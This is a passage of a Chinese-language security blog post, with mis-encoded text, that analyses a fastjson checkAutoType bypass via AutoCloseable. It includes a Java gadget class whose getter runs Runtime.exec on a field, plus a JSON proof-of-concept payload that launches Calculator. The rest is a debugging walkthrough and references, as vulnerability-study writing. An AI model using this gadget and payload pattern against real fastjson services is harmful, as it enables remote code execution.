</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09.Evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.Closeable;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName ExecCloseable
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/20 00:09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> ExecCloseable <span style="color:#fff;font-weight:bold">implements</span> AutoCloseable {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> String domain;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String getDomain() {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(domain);
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span> (IOException e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> domain;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setDomain(String domain) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">domain</span> = domain;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> close() <span style="color:#fff;font-weight:bold">throws</span> IOException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>POCå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;@type&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;java.lang.AutoCloseable&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.reus09.Evil.ExecCloseable&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;domain&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;open /System/Applications/Calculator.app&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="è°ƒè¯•-2">è°ƒè¯•<a hidden class="anchor" aria-hidden="true" href="#è°ƒè¯•-2">#</a></h5>
<p>ç¬¬ä¸€æ¬¡è¿›å…¥<code>CheckAutoType()</code>å‡½æ•°çš„æ‰§è¡Œé€»è¾‘å’Œå‰é¢è®²åˆ°çš„<code>java.lang.Exception</code>å¤„ç†é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼ŒåŒæ ·æ˜¯åœ¨<code>mappings</code>ä¸­è·å–</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420021920333.png" alt="image-20230420021920333"  />
</p>
<p>åé¢é€»è¾‘å·®ä¸å¤šï¼Œè·å¾—<code>clazz</code>ä¹‹åï¼Œç„¶åå›åˆ°<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code>æ–¹æ³•ï¼Œç„¶åè°ƒç”¨<code>ParserConfig#getDeserializer</code>æ–¹æ³•æ¥è·å¾—ååºåˆ—åŒ–å™¨ï¼Œå› ä¸º<code>AutoCloseable</code>ä¸æ»¡è¶³ä¸Šè¿°ç±»çš„è·å¾—ååºåˆ—åŒ–å™¨çš„æ¡ä»¶ï¼Œæ‰€ä»¥åˆ°äº†æœ€åä¸€æ­¥é€šè¿‡<code>ParserConfig#createJavaBeanDeserializer</code> æ–¹æ³•æ¥æ„é€  JavaBeanDeserializerå¯¹è±¡ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420022317290.png" alt="image-20230420022317290"  />
</p>
<p>ä¹‹åå°±è°ƒç”¨<code>JavaBeanDeserializer</code>çš„<code>deserialze</code>æ–¹æ³•ï¼Œ</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420022432268.png" alt="image-20230420022432268"  />
</p>
<p>åœ¨ <code>deserialze()</code> æ–¹æ³•ä¸­åˆåšäº†ä¸€æ¬¡ checkAutoType æ£€æµ‹ï¼Œæ­¤å¤„ç›´æ¥å°†ç¬¬äºŒä¸ª @type çš„ç±»åï¼Œå’Œå‰é¢æ„é€  JavaBeanDeserializer å¯¹è±¡æ—¶æŒ‡å®šçš„æœŸæœ›ç±»ç›´æ¥ä¼ äº†è¿›æ¥ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420022704968.png" alt="image-20230420022704968"  />
</p>
<p>ç„¶åå°±å’Œåœ¨<code>ThrowableDeserializer</code>çš„æ­¥éª¤å·®ä¸å¤šï¼Œæ¥åˆ°<code>expectClass</code>ä¸ä¸ºç©ºçš„æƒ…å†µï¼Œå°†æ¶æ„ç±»æ·»åŠ åˆ°<code>mappings</code>é‡Œé¢ï¼Œç„¶åè¿”å›clazzã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420022854184.png" alt="image-20230420022854184"  />
</p>
<p>checkAutoType()è°ƒç”¨å®Œè¿”å›ç±»ä¹‹åï¼Œç„¶åå†æ¬¡è·å¾—<code> JavaBeanDeserializer</code>ååºåˆ—åŒ–å™¨ï¼Œåœ¨å®ƒçš„<code>deserialze</code>æ–¹æ³•ä¸­ï¼Œæœ€ç»ˆè°ƒç”¨<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#createInstance()</code>é€šè¿‡ä»£ç†å®ä¾‹åŒ–æ¶æ„ç±»å®ä¾‹è¿›è€Œè°ƒç”¨å…¶æ„é€ å‡½æ•°ä»è€ŒæˆåŠŸè§¦å‘æ¼æ´ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420023259964.png" alt="image-20230420023259964"  />
</p>
<h3 id="fastjson-1280">fastjson-1.2.80<a hidden class="anchor" aria-hidden="true" href="#fastjson-1280">#</a></h3>
<p>è§ä¹‹å‰æ–‡ç« ã€‚</p>
<h2 id="æ€»ç»“">æ€»ç»“<a hidden class="anchor" aria-hidden="true" href="#æ€»ç»“">#</a></h2>
<p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬ç›´åˆ°å¦‚æœæƒ³è¦é€šè¿‡checkAutoTypeçš„æ£€éªŒï¼Œæœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•:</p>
<ul>
<li>ä¼ å…¥çš„ç±»åœ¨ç™½åå•ä¸­</li>
<li>å¼€å¯äº†autotype(autoTypeSupport is true)</li>
<li>ä½¿ç”¨äº†JSONTypeæ³¨è§£(å¦‚:fastjson.annotation.JSONType)</li>
<li>æŸäº›æœŸæœ›ç±» (ç»§æ‰¿äºexpectClass)</li>
<li>è¦ååºåˆ—åŒ–çš„ç±»åœ¨cacheä¸­ (TypeUtils.mappingsåˆ—è¡¨ä¸­æœ‰ @type æŒ‡å®šçš„ç±»)</li>
</ul>
<p>ä½†å…·ä½“å¯ä»¥æ“ä½œçš„è·¯çº¿ã€æ”»å‡»é“¾æ„Ÿè§‰è¿˜æ˜¯è¦å¯¹ä»£ç æœ‰è¶³å¤Ÿçš„ç†Ÿç»ƒæŒæ¡ã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼Œæ„Ÿè§‰fastjsonæ¼æ´çš„åˆ©ç”¨å¤§éƒ¨åˆ†éƒ½æ˜¯ä¸€äº›é€»è¾‘ä¸Šçš„ä»£ç é—®é¢˜ï¼ŒåŒæ—¶ä¹Ÿæ˜¯é»‘å®¢å·§å¦™çš„æ”»å‡»é“¾æ„é€ ã€‚</p>
<p>æœ€åï¼Œå­¦ä¹ åˆ°äº†ä¸€äº›<code>FastJsonååºåˆ—åŒ–</code>çš„åŸºæœ¬åŸç†ï¼Œä¹‹å‰éƒ½æ˜¯äº‘é‡Œé›¾é‡Œï¼Œä¸çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚æ­¤å¤–ï¼Œå¯¹<code>FastJson</code>çš„<code>parse</code>ã€<code>parseObject</code>ç›¸å…³æ–¹æ³•çš„åŒºåˆ«ã€‚è¿˜æœ‰å°±æ˜¯å‘ç°ç°åœ¨å†™åšå®¢å¾€å¾€éƒ½æ˜¯å¯¹åˆ«äººçš„æ–‡ç« å¤§æŠ„ç‰¹æŠ„ï¼Œè‡ªå·±çš„ä¸œè¥¿ã€æ€è€ƒå¤ªå°‘äº†ï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·å†™?ä¸ºä»€ä¹ˆè¿™ä¹ˆæ€è€ƒ?ä»¥åè¿˜æ˜¯éœ€è¦åŠªåŠ›ã€‚</p>
<h2 id="reference">Reference<a hidden class="anchor" aria-hidden="true" href="#reference">#</a></h2>
<ul>
<li><a href="https://su18.org/post/fastjson/#1-fastjson-1224">https://su18.org/post/fastjson/#1-fastjson-1224</a></li>
<li><a href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/</a></li>
<li><a href="https://www.yang99.top/index.php/archives/71/">https://www.yang99.top/index.php/archives/71/</a></li>
<li><a href="https://paper.seebug.org/1192/#comsunrowsetjdbcrowsetimpl">https://paper.seebug.org/1192/#comsunrowsetjdbcrowsetimpl</a></li>
<li><a href="https://juejin.cn/post/6846687594130964488#heading-3">https://juejin.cn/post/6846687594130964488#heading-3</a></li>
<li><a href="https://blog.csdn.net/hosaos/article/details/106982555">https://blog.csdn.net/hosaos/article/details/106982555</a></li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="/posts/tech/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">
    <span class="title">Â« Prev</span>
    <br>
    <span>Javaä¹‹åŠ¨æ€ä»£ç†</span>
  </a>
  <a class="next" href="/posts/tech/cve-2022-25845-fastjson-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
    <span class="title">Next Â»</span>
    <br>
    <span>CVE-2022-25845 FastJson RCEæ¼æ´åˆ†æ</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
